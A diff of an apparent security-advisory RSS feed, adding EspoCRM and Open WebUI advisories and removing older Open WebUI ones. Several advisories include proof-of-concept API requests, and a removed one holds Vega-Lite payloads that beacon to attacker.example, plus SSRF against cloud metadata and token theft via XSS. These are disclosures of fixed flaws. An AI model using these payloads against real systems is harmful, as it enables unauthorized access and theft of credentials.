@@ -7,7 +7,143 @@
     <atom:link href="https://stephen-cox.github.io/vulnfeed/feed.xml" rel="self"/>
     <docs>http://www.rssboard.org/rss-specification</docs>
     <generator>python-feedgen</generator>
-    <lastBuildDate>Mon, 28 Sep 2026 10:29:38 +0000</lastBuildDate>
+    <lastBuildDate>Tue, 29 Sep 2026 10:22:43 +0000</lastBuildDate>
+    <item>
+      <title>[MEDIUM] espocrm/espocrm — IDOR allowing users with access to Import scope to extract data from attachments with known ID</title>
+      <link>https://github.com/espocrm/espocrm/security/advisories/GHSA-5729-xq64-4h22</link>
+      <description>CVSS 4.3 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:L/I:N/A:N) · CWE-639, CWE-862
+
+Affected:
+- espocrm/espocrm &lt;= 10.0.6 (patched: 10.0.7)
+
+---
+
+## Summary&#13;
+&#13;
+I identified an authenticated authorization bypass in EspoCRM’s import workflow.&#13;
+&#13;
+`POST /api/v1/Import` accepts a caller-controlled `attachmentId`, but the backend does not verify that the current user is authorized to read that attachment before opening it from storage.&#13;
+&#13;
+An attacker can create their own Import record using another user’s attachment ID. After the Import record is created, the attacker can call the error export endpoint on their own Import record. EspoCRM then re-opens the original source attachment and copies source rows from that file into a new downloadable CSV attachment owned by the attacker.&#13;
+&#13;
+This allows a low-privileged authenticated user to disclose contents of another user’s attachment when the attachment ID is known.&#13;
+&#13;
+&#13;
+## Credit&#13;
+&#13;
+ @kaizhi888</description>
+      <guid isPermaLink="false">GHSA-5729-xq64-4h22</guid>
+      <category>MEDIUM</category>
+      <category>espocrm/espocrm</category>
+      <pubDate>Tue, 29 Sep 2026 07:53:33 +0000</pubDate>
+    </item>
+    <item>
+      <title>[MEDIUM] espocrm/espocrm — Address-book search does not check field-level access to emailAddress field</title>
+      <link>https://github.com/espocrm/espocrm/security/advisories/GHSA-2cr7-9g4f-8723</link>
+      <description>CVSS 4.3 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:L/I:N/A:N) · CWE-200, CWE-863
+
+Affected:
+- other/espocrm/espocrm &lt;= 10.0.6 (patched: 10.0.7)
+
+---
+
+## Summary&#13;
+&#13;
+The address-book search API does not check field level ACL against the `emailAddress` field and returns the `emailAddress` value  even if the `emailAddress` field is restricted in Roles.&#13;
+&#13;
+## Note&#13;
+&#13;
+The user needs to have access to the record. While restricting access to the email address field is rather a rare use case.&#13;
+&#13;
+## Credit&#13;
+&#13;
+Wenhao Wu, Southeast University</description>
+      <guid isPermaLink="false">GHSA-2cr7-9g4f-8723</guid>
+      <category>MEDIUM</category>
+      <category>espocrm/espocrm</category>
+      <pubDate>Tue, 29 Sep 2026 07:50:46 +0000</pubDate>
+    </item>
+    <item>
+      <title>[MEDIUM] espocrm/espocrm — Note read does not run ACL output filter leaking values of forbidden audited fields</title>
+      <link>https://github.com/espocrm/espocrm/security/advisories/GHSA-mr36-xx82-qf6h</link>
+      <description>CVSS 4.3 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:L/I:N/A:N) · CWE-200, CWE-863
+
+Affected:
+- other/espocrm/espocrm &lt;= 10.0.6 (patched: 10.0.7)
+
+---
+
+&#13;
+## Summary&#13;
+&#13;
+EspoCRM Role *Field Level Security* hides selected fields on record GET/list and, separately, strips those fields from Stream update notes via `NoteAccessControl`. `GET /Note/{id}` does not run that stripper. A user who is allowed to *stream* a parent record but forbidden to *read* a field can recover `data.attributes.was` / `became` for that field by opening the note id shown in the (already-stripped) stream.&#13;
+&#13;
+## Credit&#13;
+&#13;
+Wenhao Wu, Southeast University</description>
+      <guid isPermaLink="false">GHSA-mr36-xx82-qf6h</guid>
+      <category>MEDIUM</category>
+      <category>espocrm/espocrm</category>
+      <pubDate>Tue, 29 Sep 2026 07:50:21 +0000</pubDate>
+    </item>
+    <item>
+      <title>[HIGH] open-webui/open-webui — Terminal users can manage Terminals policies and other users' terminals via the terminal proxy</title>
+      <link>https://github.com/open-webui/open-webui/security/advisories/GHSA-q46m-r89w-j74p</link>
+      <description>CVSS 7.6 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:L/I:H/A:L) · CWE-862
+
+Affected:
+- pip/open-webui &gt;= 0.8.6, &lt; 0.11.4 (patched: 0.11.4)
+
+---
+
+# Terminal users can manage Terminals policies and other users' terminals via the terminal proxy&#13;
+&#13;
+## Summary&#13;
+A regular user who has been given access to a Terminals connection could send requests through Open WebUI's terminal proxy to the Terminals administrator API. Open WebUI forwarded any requested path and attached the administrator-configured shared key, so Terminals treated the request as an administrator request. The user could read and change terminal policies and list and stop other users' terminals, without ever seeing the key.&#13;
+&#13;
+## Preconditions&#13;
+- An administrator has added a Terminals (orchestrator) connection that uses bearer authentication (the default authentication type for terminal connections) with the Terminals API key.&#13;
+- The attacker has a normal verified account and has been granted access to that connection.&#13;
+- The connection is not pinned to a named policy. Connections pinned to a policy route requests into that policy's own terminal and do not reach the administrator API.&#13;
+- The connected Terminals server is older than 0.2.4. Terminals 0.2.4 refuses administrator requests that carry a user identity, which blocks this path independently.&#13;
+- Deployments without a Terminals connection are not affected.&#13;
+&#13;
+## Impact&#13;
+Under the preconditions above the attack needs one authenticated request per action and no interaction from anyone else. The attacker could list all active terminals with their owners' user ids, policy, instance name, host, port and activity; stop another user's running terminal; read the Terminals status and configuration; and create and change terminal policies. Changing a policy was observed to take effect on other users: environment variables set by the attacker appeared in a second user's terminal when it next started on a connection pinned to that policy. Stopped terminals are started again on the next access. Open WebUI's own data is not exposed through this path.&#13;
+&#13;
+## Fix&#13;
+Fixed in 51bb8cb142f72503e861eeee25ae4dc73c26c36b, released in 0.11.4. The terminal proxy now refuses to forward requests to the Terminals administrator paths (policies, status and terminal lifecycle). Terminals 0.2.4 additionally rejects administrator requests that arrive on behalf of a user.&#13;
+&#13;
+## Root cause&#13;
+- Component: `backend/open_webui/routers/terminals.py`, the `/api/v1/terminals/{server_id}/{path}` proxy.&#13;
+- Affected setup: every build from 0.8.6 through 0.11.3 with a Terminals connection configured.&#13;
+&#13;
+The proxy was built to let users reach their own terminal through the orchestrator, and it forwarded whatever path the user asked for with the server's shared key attached. Terminals protects its administrator API with that same key, so the proxy never separated user traffic from administrator traffic and a user could choose an administrator path.&#13;
+&#13;
+## Proof of concept&#13;
+Tested against Terminals 0.2.3 with the Docker backend and a bearer connection using the shared key, with two ordinary users. A direct request to Terminals without the key returns 401. Through Open WebUI 0.11.3, using only the attacker's own session:&#13;
+&#13;
+```&#13;
+GET  /api/v1/terminals/&lt;server_id&gt;/api/v1/policies                   -&gt; 200&#13;
+PUT  /api/v1/terminals/&lt;server_id&gt;/api/v1/policies/poc-low-user      -&gt; 200, policy created&#13;
+GET  /api/v1/terminals/&lt;server_id&gt;/api/v1/terminals                  -&gt; 200, lists the victim's terminal&#13;
+POST /api/v1/terminals/&lt;server_id&gt;/api/v1/terminals/stop&#13;
+     {"user_id":"&lt;victim&gt;","policy_id":"default","context_id":"default"}&#13;
+                                                                     -&gt; 200 {"matched":1,"stopped":1,"skipped_active":0}&#13;
+```&#13;
+&#13;
+The victim's terminal container was removed. Rewriting a policy with an `env` value and then having a second user open a connection pinned to that policy started a container carrying the attacker's value. On 0.11.4 every request above returns 403. The proxy was exercised directly with the connection configuration and user identity supplied by the test harness.&#13;
+&#13;
+## Credits&#13;
+- @dhlife09&#13;
+- @ye11oc4t&#13;
+- @jiwhan8655&#13;
+- @Dog-Parka</description>
+      <guid isPermaLink="false">GHSA-q46m-r89w-j74p</guid>
+      <category>HIGH</category>
+      <category>open-webui/open-webui</category>
+      <pubDate>Mon, 28 Sep 2026 16:36:41 +0000</pubDate>
+    </item>
     <item>
       <title>[MEDIUM] open-webui/open-webui — Other users' session tokens disclosed via OAuth-mode connections, tool servers and terminals</title>
       <link>https://github.com/open-webui/open-webui/security/advisories/GHSA-gqfh-jxvw-74rp</link>
@@ -3110,9 +3246,9 @@ Full information about the WordPress 7.0.3 release can be found here: https://wo
       <pubDate>Thu, 06 Aug 2026 18:54:17 +0000</pubDate>
     </item>
     <item>
-      <title>[MEDIUM] zammad/zammad — Stored XSS in ticket article rendering in the new Vue-based interface</title>
+      <title>[MEDIUM] zammad/zammad — Stored XSS in ticket article rendering in the new Vue-based interface (CVE-2026-102345)</title>
       <link>https://github.com/zammad/zammad/security/advisories/GHSA-4x3x-65c5-8hx4</link>
-      <description>CVSS 5.1 (CVSS:4.0/AV:N/AC:L/AT:N/PR:L/UI:P/VC:L/VI:L/VA:N/SC:L/SI:L/SA:N) · CWE-79, CWE-116
+      <description>CVE-2026-102345 · CVSS 5.1 (CVSS:4.0/AV:N/AC:L/AT:N/PR:L/UI:P/VC:L/VI:L/VA:N/SC:L/SI:L/SA:N) · CWE-79, CWE-116
 
 Affected:
 - Zammad &lt;= 7.1.1 (patched: 7.1.2)
@@ -3721,221 +3857,6 @@ The chat-completions endpoint stored the request's `features` object into reques
       <category>MEDIUM</category>
       <category>open-webui/open-webui</category>
       <pubDate>Sun, 02 Aug 2026 22:58:19 +0000</pubDate>
-    </item>
-    <item>
-      <title>[MEDIUM] open-webui/open-webui — Client-side SSRF via unrestricted external resource loading in Vega/Vega-Lite chart rendering (CVE-2026-70480)</title>
-      <link>https://github.com/open-webui/open-webui/security/advisories/GHSA-rffm-9q57-q649</link>
-      <description>CVE-2026-70480 · CVSS 4.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:R/S:C/C:L/I:N/A:N) · CWE-918
-
-Affected:
-- pip/open-webui &gt;= 0.6.34, &lt; 0.11.0 (patched: 0.11.0)
-
----
-
-# Client-side SSRF via unrestricted external resource loading in Vega/Vega-Lite chart rendering&#13;
-&#13;
-## Summary&#13;
-Open WebUI renders `vega` and `vega-lite` fenced code blocks in chat content by building a Vega view in the viewer's browser without a restricted resource loader. Any user who can place such a block where another user will see it can make that user's browser issue attacker-chosen outbound GET requests, and read back responses from same-origin or CORS-permissive targets into the rendered page. Because the request comes from the browser, server-side SSRF protections never see it.&#13;
-&#13;
-## Preconditions&#13;
-Default configuration, no flags or environment variables involved: Vega blocks render unconditionally wherever chat content is displayed. The attacker needs an account that can put content in front of the victim, which covers a shared chat, a channel message, and model, RAG or tool output the attacker can influence. The victim must open the message, so this is not zero-click. Deployments where the victim's browser has no network position of interest lose little.&#13;
-&#13;
-## Impact&#13;
-The victim's browser becomes a request proxy into whatever it can reach: internal hosts and ports behind the perimeter, same-site endpoints, and out-of-band beacons that confirm a chart was viewed and by whom. Where the target is same-origin or returns permissive CORS headers, the response body is pulled back into the chart in the victim's page, which turns the request into a read. Requests are GET only, and no server-side data is exposed to the attacker directly.&#13;
-&#13;
-## Fix&#13;
-Fixed in 5278eb906 (#26806), released in 0.11.0. The view is now constructed with a loader whose `load` always throws and whose `sanitize` resolves the URI with the browser's own URL parser and permits only `data:` and same-origin results, so charts can only use inline `data.values`. Upgrading is sufficient; no configuration change is needed.&#13;
-&#13;
-## Root cause&#13;
-- `src/lib/utils/index.ts` — `renderVegaVisualization`&#13;
-- `src/lib/components/chat/Messages/CodeBlock.svelte` — renders `vega`/`vega-lite` blocks&#13;
-&#13;
-The renderer treated a chart spec as trusted authored content rather than as untrusted chat text, so it accepted Vega's default loader. That loader has two separate ways out of the page: `data.url` and topojson/geo sources are fetched at view construction, and image marks pass their `url` through `sanitize` and are written into the output SVG as `&lt;image href&gt;`, which the browser fetches when the chart is displayed. The second path survives downstream SVG sanitization because the URL is a legitimate attribute value, not markup.&#13;
-&#13;
-## Proof of concept&#13;
-Post either block into a chat, channel message, or shared chat that the victim will open. Neither requires the victim to interact beyond viewing.&#13;
-&#13;
-```vega-lite&#13;
-{"$schema":"https://vega.github.io/schema/vega-lite/v5.json","data":{"url":"http://attacker.example/probe?a=1"},"mark":"point"}&#13;
-```&#13;
-&#13;
-```vega-lite&#13;
-{"$schema":"https://vega.github.io/schema/vega-lite/v5.json","data":{"values":[{"x":1}]},"mark":{"type":"image","url":"http://attacker.example/beacon.png"},"encoding":{"x":{"field":"x"}}}&#13;
-```&#13;
-&#13;
-The first fires at view construction; the second fires when the rendered SVG is displayed. Both are visible as outbound requests in the victim's network log and in the attacker's listener. After the fix neither request is made and inline `data.values` charts still render.&#13;
-&#13;
-## Credits&#13;
-- @Zureno — reported the issue and the `data.url` path.&#13;
-- @Classic298 — identified the image-mark sink and authored the fix.</description>
-      <guid isPermaLink="false">GHSA-rffm-9q57-q649</guid>
-      <category>MEDIUM</category>
-      <category>open-webui/open-webui</category>
-      <pubDate>Sun, 02 Aug 2026 22:54:08 +0000</pubDate>
-    </item>
-    <item>
-      <title>[MEDIUM] open-webui/open-webui — Any authenticated user can reach internal services via DNS rebinding on server-side URL fetches (CVE-2026-54020)</title>
-      <link>https://github.com/open-webui/open-webui/security/advisories/GHSA-h6x2-583h-x99r</link>
-      <description>CVE-2026-54020 · CVSS 6.3 (CVSS:3.1/AV:N/AC:H/PR:L/UI:N/S:C/C:H/I:N/A:N) · CWE-367, CWE-918
-
-Affected:
-- pip/open-webui &lt;= 0.10.2 (patched: &gt;= 0.11.0)
-
----
-
-# Any authenticated user can reach internal services via DNS rebinding on server-side URL fetches&#13;
-&#13;
-## Summary&#13;
-Open WebUI vetted user-supplied URLs by resolving the hostname once and rejecting private, loopback and link-local addresses, then let the HTTP client resolve that hostname again at connect time. An attacker who controls the authoritative DNS for a hostname they submit can answer with a public address during the check and an internal one at connect, so the fetch reaches an address the check was meant to block. Every user-reachable fetch gated by that check was affected, and most of them hand the internal response back to the attacker.&#13;
-&#13;
-## Preconditions&#13;
-- An account on the instance. No admin rights and no non-default configuration.&#13;
-- Control of the authoritative DNS for a hostname the attacker submits, serving a TTL of 0 and alternating answers.&#13;
-- One of the affected entry points: URL ingest for retrieval, an `image_url` in a chat completion, image editing, or the OAuth profile-picture fetch.&#13;
-- The OAuth path additionally needs OAuth login configured and a picture claim (`OAUTH_PICTURE_CLAIM`, default `picture`) the user can influence, which is the case on self-service OIDC providers and providers with a user-editable avatar URL. On an existing account it also needs `OAUTH_UPDATE_PICTURE_ON_LOGIN`, which is off by default. Deployments without OAuth are not affected on that path; the other paths need no configuration at all.&#13;
-&#13;
-## Impact&#13;
-The server can be made to issue requests to addresses only it can reach: cloud instance metadata such as 169.254.169.254, loopback-bound admin APIs, and internal network services. The response comes back to the attacker on most paths, as document content on the retrieval path, described by the vision model on the chat image path, and base64-encoded into the profile picture on the OAuth path; the image-edit path is blind. On the OAuth path the server also forwards the OAuth access token as a Bearer header to the fetched URL, so a rebind hands that token to the internal target. On a cloud host with IMDSv1 reachable this is enough to take instance IAM credentials.&#13;
-&#13;
-Exploitation depends on winning the gap between the two resolutions, which the attacker influences but does not fully control. Admin-configured image-generation backends and the shared session pool are not affected and deliberately keep the default client, since an administrator may legitimately point those at an internal host.&#13;
-&#13;
-## Fix&#13;
-Fixed in v0.11.0 (#24759, #25775, #25960, #26699). The check now happens at the connection layer instead of ahead of it: a `requests` transport adapter resolves the hostname once and connects to that same validated address, and an aiohttp resolver applies the same global-IP check, exposed as a one-off session used by every fetch behind the URL check. Upgrading to v0.11.0 resolves this with no configuration change.&#13;
-&#13;
-## Root cause&#13;
-Affected components:&#13;
-- retrieval web loader (`SafeWebBaseLoader`)&#13;
-- retrieval content probe (`get_content_from_url`)&#13;
-- chat image fetch (`get_image_base64_from_url`)&#13;
-- image edit fetch (`load_url_image`)&#13;
-- OAuth profile-picture fetch (`_process_picture_url`)&#13;
-&#13;
-The URL check resolved the hostname and inspected the resulting IP, but nothing tied that decision to the connection that followed: the HTTP client resolved the name again on its own, and the second answer was never inspected. The check was therefore an opinion about a past lookup rather than a constraint on the actual connection, which is what a rebinding DNS server defeats. The first connection-layer guard covered only the retrieval loader, leaving the sibling probe, image and OAuth fetches on default clients until each was reported in turn.&#13;
-&#13;
-## Credits&#13;
-- @rezaduty — the rebinding time-of-check/time-of-use bypass and the retrieval loader path.&#13;
-- @nikchillz — the retrieval content-probe path.&#13;
-- @dhyabi2 — the chat `image_url` path, where the internal response is read back through the vision model.&#13;
-- @geo-chen — the image-edit path.&#13;
-- @bogdancherniy11-sudo — the OAuth profile-picture path, where the rebind also discloses the forwarded OAuth access token.</description>
-      <guid isPermaLink="false">GHSA-h6x2-583h-x99r</guid>
-      <category>MEDIUM</category>
-      <category>open-webui/open-webui</category>
-      <pubDate>Sun, 02 Aug 2026 22:52:29 +0000</pubDate>
-    </item>
-    <item>
-      <title>[MEDIUM] open-webui/open-webui — Tool source code disclosed to read-only users via the tool list and get endpoints (CVE-2026-70491)</title>
-      <link>https://github.com/open-webui/open-webui/security/advisories/GHSA-3r7g-q6cg-q2vx</link>
-      <description>CVE-2026-70491 · CVSS 6.5 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N) · CWE-200
-
-Affected:
-- pip/open-webui &lt;= 0.10.2 (patched: 0.11.0)
-
----
-
-# Tool source code disclosed to read-only users via the tool list and get endpoints&#13;
-&#13;
-## Summary&#13;
-&#13;
-A workspace tool shared with a read grant returned its full Python source to the recipient. Any authenticated non-admin who could use a shared tool could also read its source, including any user on the instance when a tool was shared publicly. Source is meant to be a writer-only tier: the list response schema deliberately omits it and source export sits behind its own permission. The read endpoints delivered it anyway.&#13;
-&#13;
-## Preconditions&#13;
-&#13;
-- Authentication enabled (`WEBUI_AUTH=true`, default) and plugins enabled (`ENABLE_PLUGINS=true`, default).&#13;
-- The attacker is an authenticated non-admin without the `workspace.tools` permission and without a write grant on the tool.&#13;
-- A tool is shared with a read grant to the attacker, to one of their groups, or to all users (`user:*`).&#13;
-&#13;
-Deployments that share no tools, or share them only with users who already hold write access, are not affected.&#13;
-&#13;
-## Impact&#13;
-&#13;
-A non-admin obtains another user's server-side tool source. Tool source commonly embeds hard-coded API keys, credentials and internal service URLs, so the practical loss frequently extends past the code itself. The attack needs no special permission beyond an ordinary account that a tool was shared with, and no user interaction. Confidentiality only: it grants no ability to create, modify or execute tools, and no integrity or availability impact.&#13;
-&#13;
-## Fix&#13;
-&#13;
-Fixed in 0.11.0 by commit `c05de13b4` (#27005) together with `310ae9130`. The per-id endpoint now drops the source for callers without write access, and the two list endpoints no longer load source at all. Function specs stay visible to read users, since the chat tool listing renders a tool's functions from them. Tool execution loads source server-side, so shared tools keep working. Upgrading to 0.11.0 fully resolves the issue with no configuration change.&#13;
-&#13;
-## Root cause&#13;
-&#13;
-Affected components: `GET /api/v1/tools/`, `GET /api/v1/tools/list` and `GET /api/v1/tools/id/{id}` in `backend/open_webui/routers/tools.py`, and the response models in `backend/open_webui/models/tools.py`. Every build carrying the plugin routes is affected.&#13;
-&#13;
-`ToolResponse` deliberately omits the source and the specs, but its subclass `ToolUserResponse` permits extra fields, and each handler built its response by spreading a full dump of the tool model. The omitted fields were re-admitted as extras and serialised back to the caller, so the schema meant to enforce the writer-only tier enforced nothing at all. The listing path carried a second, independent defect: the flag that was supposed to keep source out of listings never changed the query it guarded.&#13;
-&#13;
-## Proof of concept&#13;
-&#13;
-Against a default instance on 0.10.2, with an admin account and a second account of role `user`:&#13;
-&#13;
-1. As the admin, create a tool whose source contains a marker secret and share it read-only with everyone:&#13;
-&#13;
-```&#13;
-POST /api/v1/tools/create&#13;
-{"id": "poctool",&#13;
- "name": "PoC Tool",&#13;
- "content": "API_KEY = \"TOOL_SRC_SECRET\"\nclass Tools:\n    def hello(self) -&gt; str: return 'hi'",&#13;
- "meta": {"description": "poc"},&#13;
- "access_grants": [{"principal_type": "user", "principal_id": "*", "permission": "read"}]}&#13;
-```&#13;
-&#13;
-2. As the non-admin, call any of the three read endpoints:&#13;
-&#13;
-```&#13;
-GET /api/v1/tools/list&#13;
--&gt; 200, item "poctool": write_access=false, content="API_KEY = \"TOOL_SRC_SECRET\" ..."&#13;
-```&#13;
-&#13;
-The same source is returned by `GET /api/v1/tools/` and `GET /api/v1/tools/id/poctool`. On 0.11.0 the identical run returns the item with no source for the non-admin, while the owner still receives it.&#13;
-&#13;
-## Credits&#13;
-&#13;
-- bogdancherniy11-sudo — reported the disclosure across the three tool read endpoints.</description>
-      <guid isPermaLink="false">GHSA-3r7g-q6cg-q2vx</guid>
-      <category>MEDIUM</category>
-      <category>open-webui/open-webui</category>
-      <pubDate>Sun, 02 Aug 2026 22:47:08 +0000</pubDate>
-    </item>
-    <item>
-      <title>[HIGH] open-webui/open-webui — Same-origin XSS to account takeover via terminal file-preview iframe hardcoding allow-same-origin (CVE-2026-70486)</title>
-      <link>https://github.com/open-webui/open-webui/security/advisories/GHSA-3xpf-xq7r-v8c5</link>
-      <description>CVE-2026-70486 · CVSS 8.2 (CVSS:3.1/AV:N/AC:H/PR:L/UI:N/S:C/C:H/I:H/A:N) · CWE-79, CWE-1021
-
-Affected:
-- pip/open-webui &gt;= 0.9.0, &lt;= 0.10.2 (patched: 0.11.0)
-
----
-
-# Same-origin XSS to account takeover via terminal file-preview iframe hardcoding allow-same-origin&#13;
-&#13;
-## Summary&#13;
-Any authenticated user with access to a terminal server could get script of their choosing to run in the Open WebUI origin itself. The HTML file preview rendered terminal-served files in an iframe whose sandbox always granted `allow-same-origin` alongside `allow-scripts`, and the file is served from a path on the application's own origin, so the sandbox provided no isolation at all. Script in a previewed file could read the victim's session token and take over the account.&#13;
-&#13;
-## Preconditions&#13;
-- At least one terminal server configured by an admin (`TERMINAL_SERVER_CONNECTIONS`, empty by default) and reachable by the victim. Deployments with no terminal server configured are not affected.&#13;
-- The attacker needs a normal authenticated account with access to that terminal server, no admin rights.&#13;
-- No victim interaction beyond having the chat open: a `display_file` tool call opens the preview automatically.&#13;
-- `TERMINAL_PROXY_HEADERS` unset, which is the default. An operator who had already set a restrictive Content-Security-Policy through it was not exposed, since those headers are merged into every proxied response including the served file.&#13;
-- The `iframeSandboxAllowSameOrigin` user setting is off by default, but the affected branch ignored it entirely.&#13;
-&#13;
-## Impact&#13;
-The previewed document runs in the application origin, so it can reach the parent window, read the session token out of `localStorage` and exfiltrate it, which is full account takeover of the victim. If the victim is an admin, or any user holding `workspace.functions`, that takeover extends to server-side code execution through Functions. Getting the malicious file written and displayed still requires a prompt-injection or a social step, which is what keeps the complexity high rather than trivial. Instances with no terminal server configured were never affected, and neither was the `srcdoc` preview path.&#13;
-&#13;
-## Fix&#13;
-Fixed in 0.11.0 by 65a5fad7b (#26907). The `serveUrl` preview branch now gates `allow-same-origin` behind the same `iframeSandboxAllowSameOrigin` setting the `srcdoc` branch already used, so by default the preview loads at an opaque origin and cannot reach the parent context. Upgrading is sufficient, no configuration change is required, and HTML previews continue to render normally.&#13;
-&#13;
-## Root cause&#13;
-- `src/lib/components/chat/FileNav/FilePreview.svelte`, the `serveUrl` iframe branch, reached for HTML files served through `/api/v1/terminals/{id}/files/serve/...`.&#13;
-- Present from 0.9.0, where that branch was introduced, through 0.10.2.&#13;
-&#13;
-The component grew two preview paths. The `srcdoc` path was hardened: same-origin became opt-in and a CSP was injected into the document. The `serveUrl` path, added later for files streamed from a terminal server, kept a static sandbox string with `allow-same-origin` baked into it. Because the terminal proxy is mounted under the application's own origin and forwards the upstream response without adding a Content-Security-Policy of its own unless the operator configured one, and no global CSP is set, the sandbox was the only isolation boundary left, and it was granting precisely the permission that dissolved it.&#13;
-&#13;
-## Proof of concept&#13;
-Write an HTML file containing a script that reads `window.parent.localStorage.token` to a terminal server the victim can reach, then trigger `display_file` for that file. The chat handler opens the preview on the resulting `terminal:display_file` event with no click, the script executes at the application origin, and the token is exfiltrated.&#13;
-&#13;
-## Credits&#13;
-Reported by @manus-use (researcher zx / Jace).</description>
-      <guid isPermaLink="false">GHSA-3xpf-xq7r-v8c5</guid>
-      <category>HIGH</category>
-      <category>open-webui/open-webui</category>
-      <pubDate>Sun, 02 Aug 2026 22:30:32 +0000</pubDate>
     </item>
   </channel>
 </rss>
